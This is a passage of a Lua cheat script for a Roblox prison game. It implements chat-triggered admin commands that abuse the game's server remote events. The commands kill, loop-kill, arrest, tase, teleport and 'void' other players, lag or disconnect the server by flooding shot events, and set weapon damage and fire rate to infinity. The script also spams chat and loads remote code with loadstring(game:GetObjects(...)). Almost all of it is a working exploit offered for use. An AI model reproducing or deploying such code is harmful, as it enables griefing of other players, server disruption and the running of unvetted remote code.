									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [7] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [8] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}
							}

							game:GetService("ReplicatedStorage").ShootEvent:FireServer(args, Gun)
						end)
					end)()
				end
			end
		end
		if Command("unlagserver") or Command("stopdisconnect") or Command("undisconnect") then
			States.Lag_Server = false
			Notify("Unlagging server", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("gravity") or Command("setgravity") then
			local Gravity = tonumber(Arg2)
			if Gravity ~= nil then
				workspace.Gravity = Gravity
				Notify("Changed gravity to "..Gravity, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Count needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("makecrim") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(Player, CFrame.new(-919, 96, 2138))
				Notify("Crimmed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("resetgravity") or Command("regravity") then
			workspace.Gravity = 196.2
			Notify("Resetted gravity", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resethipheight") or Command("rehipheight") then
			game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
			Notify("Resetted hip height", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resetspeed") or Command("respeed") then
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
			Notify("Resetted walk speed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resetjumppower") or Command("rejumppower") then
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
			Notify("Resetted jump power", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("leave") or Command("leaveserver") or Command("quit") then
			Notify("Leaving server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:Shutdown()
		end
		if Command("rejoin") or Command("rj") then
			Notify("Rejoining server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
		end
		if Command("nodoors") or Command("deletedoors") then
			if workspace:FindFirstChild("Doors") then
				workspace.Doors.Parent = game.Lighting
			end
			Notify("Deleted doors", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("doors") or Command("restoredoors") then
			if game.Lighting:FindFirstChild("Doors") then
				game.Lighting.Doors.Parent = workspace
			end
			Notify("Restored doors", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nowalls") or Command("deletedoors") then
			pcall(function()
				for i,v in pairs(Walls) do
					v.Parent = game.Lighting
				end
			end)
			Notify("Deleted walls", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("walls") or Command("restorewalls") then
			pcall(function()
				for i,v in pairs(game.Lighting:GetChildren()) do
					if v.Name ~= "Doors" then
						v.Parent = workspace
					end
				end
			end)
			Notify("Restored walls", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("god") or Command("godmode") then
			States.God_Mode = true
			Notify("Turn god mode on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.God_Mode then
					game.Players.LocalPlayer.Character.Humanoid.Name = 1
					local l = game.Players.LocalPlayer.Character["1"]:Clone()
					l.Parent = game.Players.LocalPlayer.Character
					l.Name = "Humanoid"
					game.Players.LocalPlayer.Character.Animate.Disabled = true
					wait()
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character["1"]:Destroy()
					game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
					wait(5)
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					local savedteam = GetTeam()
					workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
					workspace.CurrentCamera.CFrame = savedcamcf
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				end
			end
		end
		if Command("ungod") or Command("ungodmode") then
			States.God_Mode = false
			Notify("Turn god mode off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("arrest") or Command("handcuffs") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Arrest(Player, tonumber(Arg3))
				Notify("Arrested "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("arrestall") or Command("arrestother") or Command("arrestothers") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Really red" then
						Arrest(v, 30)
					end
				end
			end
			Notify("Arrested all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("opengate") then
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
			Notify("Opened gate", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("getpos") then
			print("Humanoid Root Part Position :")
			print(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
			print("Camera CFrame :")
			print(workspace.CurrentCamera.CFrame)
			Notify("Printed positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("saveposition") or Command("savepos") then
			States.SavedCFrame = GetPos()
			Notify("Saved positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loadposition") or Command("loadpos") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = States.SavedCFrame
			Notify("Loaded positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("spamchat") then
			States.SpamChat = true
			Notify("Spamming chat", Color3.fromRGB(0, 255, 0), "Success")
			if tonumber(Arg2) ~= nil then
				States.Spam_Wait = tonumber(Arg2)
			else
				States.Spam_Wait = 1
			end
			while wait() do
				if States.SpamChat then
					local MessagesToChat = {
						"I'm your dad",
						"I'm your mom",
						"I'm a god and I'm your dad",
						"__________",
						"OMG",
						"OML",
						"BEPP BOP BEEP BEEP BOP",
						" ",
						"I'm magic guy because i pressed W,A,S and D on my keyboard and my character can be walked wow, I'M THE REAL MAGIC GUY!",
						"I'M THE MOST PRO IN HERE",
						"I'M A PRO IN THIS SERVER ALL OF YOU ARE NOOB!",
						"LOL XD LOL XD LOL XD",
						"Read my chat",
						"Can you die while you are died?",
						"You know what, I'm a god",
						"Sub to CXZ NAME_R",
						"WOW",
						"wow",
						"\(￣︶￣*\))"
					}

					while true do
						wait(States.Spam_Wait)
						if States.SpamChat then
							pcall(function()
								Chat(MessagesToChat[math.random(1, #MessagesToChat)])
							end)
						end
					end
				end
			end
		end
		if Command("unspamchat") then
			States.SpamChat = false
			Notify("Unspamming chat", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("rapidfire") then
			local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
			local Name
			local Req
			if Tool then
				Notify("Activated rapid fire", Color3.fromRGB(0, 255, 0), "Success")
				States.CAN = true
				Name = Tool.Name
				if Tool:FindFirstChild("GunStates") then
					Req = require(Tool.GunStates)
					Req["MaxAmmo"] = Req["MaxAmmo"]
					Req["StoredAmmo"] = Req["StoredAmmo"]
					Req["AmmoPerClip"] = Req["AmmoPerClip"]
					Req["CurrentAmmo"] = Req["CurrentAmmo"]
					Req["FireRate"] = -math.huge
					Req["Bullets"] = 25
					Req["Range"] = math.huge
					Req["Damage"] = math.huge
					Req["ReloadTime"] = -math.huge
					Req["AutoFire"] = true
				end
			end
			while wait() do
				pcall(function()
					if game.Players.LocalPlayer.Character:FindFirstChild(Name) and States.CAN then
						if Req["CurrentAmmo"] < 1 then
							Tool:Destroy()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Name].ITEMPICKUP)
							Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(Name)
							if Tool then
								Name = Tool.Name
								Tool.Parent = game.Players.LocalPlayer.Character
								Tool = game.Players.LocalPlayer.Character[Name]
								Req = require(Tool.GunStates)
								Req["MaxAmmo"] = Req["MaxAmmo"]
								Req["StoredAmmo"] = Req["StoredAmmo"]
								Req["AmmoPerClip"] = Req["AmmoPerClip"]
								Req["CurrentAmmo"] = Req["CurrentAmmo"]
								Req["FireRate"] = -math.huge
								Req["Bullets"] = 25
								Req["Range"] = math.huge
								Req["Damage"] = math.huge
								Req["ReloadTime"] = -math.huge
								Req["AutoFire"] = true
							end
						end
					end
				end)
			end
		end
		if Command("autorapidfire") then
			States.Auto_RapidFire = true
			Notify("Turn auto rapid fire on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				game.Players.LocalPlayer.Character.ChildAdded:Connect(function(Item)
					if States.Auto_RapidFire then
						local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
						local Name
						local Req
						if Tool then
							States.CAN = true
							Name = Tool.Name
							if Tool:FindFirstChild("GunStates") then
								Req = require(Tool.GunStates)
								Req["MaxAmmo"] = Req["MaxAmmo"]
								Req["StoredAmmo"] = Req["StoredAmmo"]
								Req["AmmoPerClip"] = Req["AmmoPerClip"]
								Req["CurrentAmmo"] = Req["CurrentAmmo"]
								Req["FireRate"] = -math.huge
								Req["Bullets"] = 25
								Req["Range"] = math.huge
								Req["Damage"] = math.huge
								Req["ReloadTime"] = -math.huge
								Req["AutoFire"] = true
							end
						end
						while wait() do
							pcall(function()
								if game.Players.LocalPlayer.Character:FindFirstChild(Name) and States.CAN then
									if Req["CurrentAmmo"] < 1 then
										Tool:Destroy()
										workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Name].ITEMPICKUP)
										Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(Name)
										if Tool then
											Name = Tool.Name
											Tool.Parent = game.Players.LocalPlayer.Character
											Tool = game.Players.LocalPlayer.Character[Name]
											Req = require(Tool.GunStates)
											Req["MaxAmmo"] = Req["MaxAmmo"]
											Req["StoredAmmo"] = Req["StoredAmmo"]
											Req["AmmoPerClip"] = Req["AmmoPerClip"]
											Req["CurrentAmmo"] = Req["CurrentAmmo"]
											Req["FireRate"] = -math.huge
											Req["Bullets"] = 25
											Req["Range"] = math.huge
											Req["Damage"] = math.huge
											Req["ReloadTime"] = -math.huge
											Req["AutoFire"] = true
										end
									end
								end
							end)
						end
					end
				end)
			end)
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
			else
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
		end
		if Command("unautorapidfire") then
			States.Auto_RapidFire = false
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
			else
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
			Notify("Turn auto rapid fire off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("notifybar") then
			Background4.Visible = true
		end
		if Command("loopbring") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Notify("Looping bring "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
				States.PlayerToLoopBring = Player
				States.LoopBring = true
				repeat wait()
					pcall(function()
						if States.LoopBring and game.Players[States.PlayerToLoopBring.Name] then
							local savedcf = GetPos()
							Teleport(States.PlayerToLoopBring, GetPos())
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
						end
					end)
				until States.LoopBring == false
			end
		end
		if Command("unloopbring") then
			States.LoopBring = false
			States.PlayerToLoopBring = nil
			Notify("Unlooping bring", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("admin") or Command("giveadmin") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not Admin[Player.UserId] then
				Admin[Player.UserId] = {Player = Player}
				Chat("/w "..Player.Name.." You've got admin permissions! Type "..Prefix.."cmds or "..Prefix.."cmd to see all commands")
				Notify("Gave "..Player.Name.." admin commands", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already admin", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("unadmin") or Command("removeadmin") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and Admin[Player.UserId] then
				Admin[Player.UserId] = nil
				Chat("/w "..Player.Name.." You are bad you've been removed admin permissions")
				Notify("Removed admins from "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already admin", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("baseballbat") or Command("bat") then
			local LocalPlayer = game.Players.LocalPlayer
			local Character = LocalPlayer.Character
			local Backpack = LocalPlayer.Backpack
			local Humanoid = Character.Humanoid
			if not Backpack:FindFirstChild("Bat") or not Backpack:FindFirstChild("Bat") then
				local BaseBallBat = Instance.new("Tool", Backpack)
				local Handle = Instance.new("Part", BaseBallBat)
				BaseBallBat.GripPos = Vector3.new(0, -1.15, 0)
				BaseBallBat.Name = "Bat"
				Handle.Name = "Handle"
				Handle.Size = Vector3.new(0.4, 5, 0.4)
				local Animation =Instance.new("Animation", BaseBallBat)
				Animation.AnimationId = "rbxassetid://218504594"
				local Track = Humanoid:LoadAnimation(Animation)
				local Cooldown = false
				local Attacked = false
				local Attacking = false
				BaseBallBat.Equipped:Connect(function()
					BaseBallBat.Activated:Connect(function()
						if not Cooldown then
							Cooldown = true
							Attacking = true
							Track:Play()
							Handle.Touched:Connect(function(Hit)
								if Hit.Parent and Hit.Parent ~= game.Players.LocalPlayer and not Attacked and Attacking then
									Attacked = true
									for i = 1,15 do
										game.ReplicatedStorage.meleeEvent:FireServer(game.Players[Hit.Parent.Name])
									end
								end
							end)
							wait(0.25)
							Cooldown = false
							Attacked = false
							Attacking = false
						end
					end)
				end)
			end
			Notify("Obtained base ball bat", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("tools") or Command("tool") or Command("btool") or Command("btools") then
			local Backpack = game.Players.LocalPlayer.Backpack
			local Character = game.Players.LocalPlayer.Character
			if not Backpack:FindFirstChild("Bin_1") and not Character:FindFirstChild("Bin_1") then
				local HopperBin_1 = Instance.new("HopperBin", Backpack)
				HopperBin_1.BinType = 1
				HopperBin_1.Name = "Bin_1"
			end
			if not Backpack:FindFirstChild("Bin_2") and not Character:FindFirstChild("Bin_2") then
				local HopperBin_2 = Instance.new("HopperBin", Backpack)
				HopperBin_2.BinType = 2
				HopperBin_2.Name = "Bin_2"
			end
			if not Backpack:FindFirstChild("Bin_3") and not Character:FindFirstChild("Bin_3") then
				local HopperBin_3 = Instance.new("HopperBin", Backpack)
				HopperBin_3.BinType = 3
				HopperBin_3.Name = "Bin_3"
			end
			if not Backpack:FindFirstChild("Bin_4") and not Character:FindFirstChild("Bin_4") then
				local HopperBin_4 = Instance.new("HopperBin", Backpack)
				HopperBin_4.BinType = 4
				HopperBin_4.Name = "Bin_4"
			end
			loadstring(game:GetObjects("rbxassetid://552440069")[1].Source)()
			Notify("Obtained btools", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("test") then
			local savedcf = GetPos()
			local CrimPad = workspace["Criminals Spawn"].SpawnLocation
			local padcf = CrimPad.CFrame
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
			wait()
			CrimPad.CFrame = GetPos()
			CrimPad.CanCollide = false
			CrimPad.Transparency = 1.000
			CrimPad.Anchored = true 
			pcall(function()
				for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						CrimPad.CFrame = v.Character.HumanoidRootPart.CFrame
					end
				end
				for i,v in pairs(game.Teams.Guards:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						CrimPad.CFrame = v.Character.HumanoidRootPart.CFrame
					end
				end
			end)
			workspace.Remote.loadchar:InvokeServer()
			CrimPad.Transparency = 0.000
			CrimPad.CFrame = padcf
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			Notify("???", Color3.fromRGB(0, 0, 0), "LOL")
		end
		if Command("antilag") or Command("boostfps") then
			States.BoostFps = true
			Notify("Turn anti lag on", Color3.fromRGB(0, 255, 0), "Success")
			for _, v in pairs(game:GetDescendants()) do
				pcall(function()
					v.Material = Enum.Material.Plastic
					States[v.Name] = {Material = v.Material}
				end)
			end
			while wait() do
				if States.BoostFps then
					for i,v in pairs(game.Players:GetChildren()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health < 1 then
									v.Character:Destroy()
								end
							end)
						end
					end
				end
			end
		end
		if Command("unantilag") then
			States.BoostFps = false
			Notify("Turn anti lag off", Color3.fromRGB(0, 255, 0), "Success")
			for _, v in pairs(game:GetDescendants()) do
				pcall(function()
					v.Material = States[v.Name].Material
				end)
			end
		end
		if Command("serverhop") or Command("newserver") or Command("changeserver") then
			Notify("Changing server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
		if Command("nexus") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
		end
		if Command("cafe") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(877, 100, 2256)
		end
		if Command("backnexus") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(982, 100, 2334)
		end
		if Command("yard") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(791, 98, 2498)
		end
		if Command("crimbase") or Command("criminalbase") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-943, 95, 2055)
		end
		if Command("armory") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(789, 100, 2260)
		end
		if Command("lunchroom") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(905, 100, 2226)
		end
		if Command("gate") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(505, 103, 2250)
		end
		if Command("tower") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(822, 131, 2588)
		end
		if Command("gatetower") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(502, 126, 2306)
		end
		if Command("sewer") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916, 79, 2311)
		end
		if Command("makecrimall") then
			local savedcf = GetPos()
			local CrimPad = workspace["Criminals Spawn"].SpawnLocation
			local padcf = CrimPad.CFrame
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CrimPad.CFrame
			wait()
			CrimPad.CFrame = GetPos()
			CrimPad.CanCollide = false
			CrimPad.Transparency = 1.000
			CrimPad.Anchored = true
			repeat wait() 
				pcall(function()
					for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							Teleport(v, CrimPad.CFrame)
						end
					end
					for i,v in pairs(game.Teams.Guards:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							Teleport(v, CrimPad.CFrame)
						end
					end
				end)
			until #game.Teams.Criminals:GetPlayers() == (#game.Players:GetPlayers()-#game.Teams.Neutral:GetPlayers())
			workspace.Remote.loadchar:InvokeServer()
			CrimPad.Transparency = 0.000
			CrimPad.CFrame = padcf
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			Notify("Make everyone crimmed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("bringall") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					Teleport(v, GetPos())
				end
			end
			Notify("Broght all", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("notify") then
			States.Notify = true
			Notify("Notify on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nonotify") then
			States.Notify = false
			Notify("Notify off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if PrefixCommand("getprefix") then
			Chat("Prefix : "..Prefix)
			Notify("Prefix : "..Prefix, Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("cmd") or Command("cmds") then
			if Background.Visible == true then
				Background.Visible = false
			else
				Background.Visible = true
			end
			Notify("Showed Commands", Color3.fromRGB(0, 255, 0), "Success")
		end

	end

	function AdminPlayerChatted(Message, Player)
		Split = Message:split(" ")
		Arg1 = Split[1]
		Arg2 = Split[2]
		Arg3 = Split[3]
		Arg4 = Split[4]
		if Command("nexus") then
			Teleport(Player, CFrame.new(888, 100, 2388))
		end
		if Command("cafe") then
			Teleport(Player, CFrame.new(877, 100, 2256))
		end
		if Command("backnexus") then
			Teleport(Player,  CFrame.new(982, 100, 2334))
		end
		if Command("armory") then
			Teleport(Player, CFrame.new(789, 100, 2260))
		end
		if Command("tower") then
			Teleport(Player, CFrame.new(822, 131, 2588))
		end
		if Command("crimbase") or Command("criminalbase") then
			Teleport(Player, CFrame.new(-942, 94, 2055))
		end
		if Command("bring") then
			TeleportV(GetPlayer(Arg2), Player)
		end
		if Command("void") then
			Teleport(GetPlayer(Arg2), CFrame.new(99999, 99999, 99999))
		end
		if Command("beam") then
			Beam(GetPlayer(Arg2), math.huge, 1)
		end
		if Command("yard") then
			Teleport(Player, CFrame.new(791, 98, 2498))
		end
		if Command("disconnect") then
			States.Disconnect = true
			while wait() do
				if States.Disconnect then
					coroutine.wrap(function()
						pcall(function()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

							local Gun = game.Players.LocalPlayer.Backpack["Remington 870"] or game.Players.LocalPlayer.Character["Remington 870"]

							local args = {
								[1] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [2] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [3] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [4] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [5] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [6] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [7] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [8] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}
							}

							game:GetService("ReplicatedStorage").ShootEvent:FireServer(args, Gun)
						end)
					end)()
				end
			end
		end
		if Command("undisconnect") then
			States.Disconnect = false
		end
		if Command("spamarrest") then
			local GP = GetPlayer(Arg2)
			if GP then
				States.SpamArrest2 = true
				repeat wait()
					local Time = 0
					pcall(function()
						if GP.TeamColor.Name == "Bright orange" then
							Teleport(GP, GetPos())
							repeat wait(.01)
								Time = Time + 1
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = GP.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
								workspace.Remote.arrest:InvokeServer(GP.Character.Head)
							until GP.Character.Head:FindFirstChild("handcuffedGui") or Time >= 250
							if GP.Character.Head:FindFirstChild("handcuffedGui") then
								Arrest(GP, 10000)
							end
						end
						if GP.TeamColor.Name ~= "Really red" and not GP.Character.Head:FindFirstChild("handcuffedGui") then
							if not States.SpamArrest2 then return end
							repeat Teleport(GP, CFrame.new(-919, 96, 2138)) until GP.TeamColor.Name == "Really red" or not States.SpamArrest2 or not game.Players[GP.Name]
						end
						wait(.1)
						if not GP.Character.Head:FindFirstChild("handcuffedGui") then
							Arrest(GP, 10000)
						end
					end)
				until not States.SpamArrest2 or not game.Players[GP.Name]
			end
		end
		if Command("unspamarrest") then
			States.SpamArrest2 = false
		end
		if Command("killguard") or Command("killguards") then
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killinmate") or Command("killinmates") then
			for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killcriminal") or Command("killcriminals") then
			for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("killall") or Command("killothers") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer or v ~= Player then
					Kill(v)
				end
			end
		end
		if Command("kill") or Command("kills") then
			Kill(GetPlayer(Arg2))
		end
		if Command("loopkill") or Command("loopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = {Player = Player}
			end
		end
		if Command("unloopkill") or Command("unloopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = nil
			end
		end
		if Command("tase") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Tase(Player)
			end
		end
		if Command("makecrim") then
			Teleport(GetPlayer(Arg2), CFrame.new(-919, 96, 2138))
		end
		if Command("arrest") then
			Arrest(GetPlayer(Arg2))
		end
		if Command("crim") then
			Teleport(Player, CFrame.new(-919, 96, 2138))
		end
		if Command("goto") or Command("to") then
			TeleportV(Player, GetPlayer(Arg2))
		end
		if Command("cmd") or Command("cmds") then
			Chat("/w "..Player.Name.." "..Prefix.."goto [plr] "..Prefix.."to [plr] "..Prefix.."kill [plr] "..Prefix.."kills [plr] "..Prefix.."makecrim [plr] "..Prefix.."arrest [plr] "..Prefix.."tase [plr] "..Prefix.."loopkill [plr] "..Prefix.."unloopkill [plr]") wait(.1)
			Chat("/w "..Player.Name.." "..Prefix.."crim "..Prefix.."tower "..Prefix.."nexus "..Prefix.."backnexus "..Prefix.."cafe "..Prefix.."armory "..Prefix.."bring [plr]") wait(.1)
			Chat("/w "..Player.Name.." "..Prefix.."killall "..Prefix.."killothers "..Prefix.."killinmate "..Prefix.."killinmates "..Prefix.."killguard "..Prefix.."killguards "..Prefix.."killcriminals "..Prefix.."killcriminal "..Prefix.."void [plr]")
			Chat("/w "..Player.Name.." "..Prefix.."spamarrest [plr] "..Prefix.."unspamarrest "..Prefix.."disconnect "..Prefix.." "..Prefix.."beam [plr]")
			Chat("/w "..Player.Name.." "..Prefix.."cmd "..Prefix.."cmds") wait(.1)
		end
	end

	game.Players.LocalPlayer.Chatted:Connect(PlayerChatted)

	spawn(function()
		while wait() do
			for i,v in pairs(LoopKill) do
				pcall(function()
					if v.Player and v.Player.Character and v.Player.Character.Head and v.Player.Character.Humanoid.Health ~= 0 then
						Kill(v.Player)
					end
				end)
			end
		end
	end)

	spawn(function()
		while wait() do
			for i,v in pairs(LoopBeam) do
				pcall(function()
					if v and v.Player and v.Player.Character and v.Player.Character.Head and v.Player.Character.HumanoidRootPart then
						Beam(v.Player, math.huge, 1)
					end
				end)
			end
		end
	end)

	spawn(function()
		while wait() do
			if States.Fast_Punch == true then
				pcall(function()
					getsenv(game.Players.LocalPlayer.Character.ClientInputHandler).cs.isFighting = false
				end)
			end
		end
	end)

	coroutine.wrap(function()
		while wait() do
			if States.Kill_Aura then
				for i,v in pairs(game.Players:GetPlayers()) do
					pcall(function()
						if v ~= game.Players.LocalPlayer then
							local Distance = (v.Character:FindFirstChildOfClass("Part").Position - game.Players.LocalPlayer.Character:FindFirstChildOfClass("Part").Position).magnitude
							if Distance <= 10 then
								for i = 1,25 do
									game.ReplicatedStorage.meleeEvent:FireServer(v)
								end
							end
						end
					end)
				end
			end
